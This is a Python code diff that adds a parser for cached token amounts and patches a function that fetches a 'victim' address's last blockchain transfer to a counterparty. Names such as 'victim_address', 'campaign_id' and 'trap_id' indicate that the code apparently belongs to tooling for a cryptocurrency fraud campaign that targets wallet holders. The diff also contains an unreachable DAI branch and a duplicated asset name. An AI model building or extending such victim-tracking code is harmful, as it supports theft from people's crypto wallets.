@@ -697,6 +697,53 @@ def get_counterparty_from_db(victim_address, campaign_id):
         logger.error(f"Failed to fetch counterparty for victim {victim_address}: {e}")
         return None
 
+
+def parse_cached_amount(amount_str, asset):
+    """
+    Parse cached amount from any format the database might have stored it in.
+    Returns the amount in smallest units (wei for native, raw units for ERC-20).
+    """
+    if not amount_str:
+        return 0
+    
+    amount_str = str(amount_str).strip()
+    
+    # Hex string (e.g., "0x21c94ac0") — ERC-20 raw units from Alchemy
+    if amount_str.startswith('0x') or amount_str.startswith('0X'):
+        return int(amount_str, 16)
+    
+    # Decimal float (e.g., "15.988555750235143") — native coin in human-readable form
+    if '.' in amount_str:
+        try:
+            value_float = float(amount_str)
+            if asset in ('ETH', 'BNB', 'MATIC', 'ETH', 'WETH'):
+                # Native coins: 18 decimals
+                return int(value_float * (10 ** 18))
+            elif asset in ('USDC', 'USDT', 'USDP', 'TUSD', 'FRAX', 'BUSD', 'USDCe'):
+                # Stablecoins: 6 decimals (USDC/USDT) or 18 decimals (DAI)
+                if asset == 'DAI':
+                    return int(value_float * (10 ** 18))
+                return int(value_float * (10 ** 6))
+            elif asset in ('WBTC', 'renBTC'):
+                # Wrapped BTC: 8 decimals
+                return int(value_float * (10 ** 8))
+            else:
+                # Default to 18 decimals for unknown tokens
+                return int(value_float * (10 ** 18))
+        except (ValueError, OverflowError):
+            return 0
+    
+    # Plain integer string (e.g., "3136" or "15000000000000000000")
+    try:
+        value = int(amount_str)
+        # If it looks like a human-readable number (very small), convert to wei
+        if value < 1000000 and asset in ('ETH', 'BNB', 'MATIC'):
+            return int(value * (10 ** 18))
+        return value
+    except ValueError:
+        return 0
+    
+
 def fetch_last_transfer_from_blockchain(victim_address, counterparty_address, trap_id=None):
     """
     Fetch the most recent transfer with database caching.
@@ -818,10 +865,11 @@ def fetch_last_transfer_from_blockchain(victim_address, counterparty_address, tr
                                             
                                             return (symbol, value_units)
                 
-                # No new transfers found since cached block
+                               # No new transfers found since cached block
                 if cached_asset and cached_amount:
-                    logger.info(f"[Cache] No new transfers since block {cached_block}, using cached: {cached_amount} {cached_asset}")
-                    return (cached_asset, int(cached_amount))
+                    parsed_amount = parse_cached_amount(cached_amount, cached_asset)
+                    logger.info(f"[Cache] No new transfers since block {cached_block}, using cached: {cached_amount} {cached_asset} → {parsed_amount} units")
+                    return (cached_asset, parsed_amount)
                 
                 # First run - no cache and no transfers found
                 logger.info(f"[Alchemy] No transfers found in history")
@@ -840,11 +888,15 @@ def fetch_last_transfer_from_blockchain(victim_address, counterparty_address, tr
                         time.sleep(2)
                 continue
         
-        # All Alchemy URLs failed
+               # All Alchemy URLs failed
         if cached_asset and cached_amount:
             # Use cached data if available
-            logger.warning(f"[Cache] Alchemy failed, using cached: {cached_amount} {cached_asset}")
-            return (cached_asset, int(cached_amount))
+            parsed_amount = parse_cached_amount(cached_amount, cached_asset)
+            if parsed_amount > 0:
+                logger.warning(f"[Cache] Alchemy failed, using cached: {cached_amount} {cached_asset} → {parsed_amount} units")
+                return (cached_asset, parsed_amount)
+            else:
+                logger.error(f"[Cache] Could not parse cached amount: '{cached_amount}' for {cached_asset}")
         
         # No cache and all APIs failed - skip this victim
         logger.error(f"[SKIP] All Alchemy URLs failed and no cache available for {victim_address}")
